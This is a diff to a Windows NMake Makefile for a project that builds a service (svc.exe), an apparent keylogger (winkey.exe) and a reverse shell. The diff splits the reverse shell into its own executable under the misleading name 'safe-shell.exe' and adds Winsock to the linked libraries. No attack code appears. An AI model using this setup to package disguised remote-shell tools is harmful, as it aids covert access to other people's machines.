@@ -3,15 +3,17 @@
 # Configuration
 TINKY_NAME = svc.exe
 WINKEY_NAME = winkey.exe
+RSHELL_NAME = safe-shell.exe
 TINKY_INCL = /I tinky\include
 COMPILER = cl.exe
 CFLAGS = /nologo /Wall /WX /EHsc /wd4668 /wd4865 /wd5039 /wd5045 /wd4820
 OBJDIR = obj
-LIBS = Advapi32.lib psapi.lib user32.lib
+LIBS = Advapi32.lib psapi.lib user32.lib Ws2_32.lib
 
 # Sources
 TINKY_SRC = tinky\src\*.cpp
 WINKEY_SRC = winkey\winkey.cpp
+RSHELL_SRC = reverse-shell\reverseShell.cpp
 
 # Objets
 TINKY_OBJ = $(OBJDIR)\main.obj \
@@ -23,13 +25,14 @@ TINKY_OBJ = $(OBJDIR)\main.obj \
             $(OBJDIR)\serviceControlManaged.obj \
             $(OBJDIR)\start.obj \
             $(OBJDIR)\stop.obj \
-			$(OBJDIR)\reverseShell.obj \
-			$(OBJDIR)\process.obj
+			$(OBJDIR)\processes.obj
 
 WINKEY_OBJ = $(OBJDIR)\winkey.obj
 
+RSHELL_OBJ = $(OBJDIR)\reverseShell.obj
+
 # Règle par défaut
-all: $(OBJDIR) $(TINKY_NAME) $(WINKEY_NAME)
+all: $(OBJDIR) $(TINKY_NAME) $(WINKEY_NAME) $(RSHELL_NAME)
 
 # Créer dossier obj
 $(OBJDIR):
@@ -42,12 +45,18 @@ $(TINKY_NAME): $(TINKY_OBJ)
 $(WINKEY_NAME): $(WINKEY_OBJ)
 	$(COMPILER) $(CFLAGS) /Fe$@ $(WINKEY_OBJ) $(LIBS)
 
+$(RSHELL_NAME): $(RSHELL_OBJ)
+	$(COMPILER) $(CFLAGS) /Fe$@ $(RSHELL_OBJ) $(LIBS)
+
 # Règle d'inférence pour tinky
 {tinky\src}.cpp{$(OBJDIR)}.obj:
 	$(COMPILER) $(CFLAGS) $(TINKY_INCL) /c $< /Fo$@
 
 # Règle d'inférence pour winkey
 {winkey}.cpp{$(OBJDIR)}.obj:
+	$(COMPILER) $(CFLAGS) /c $< /Fo$@
+
+{reverse-shell}.cpp{$(OBJDIR)}.obj:
 	$(COMPILER) $(CFLAGS) /c $< /Fo$@
 
 # Nettoyage
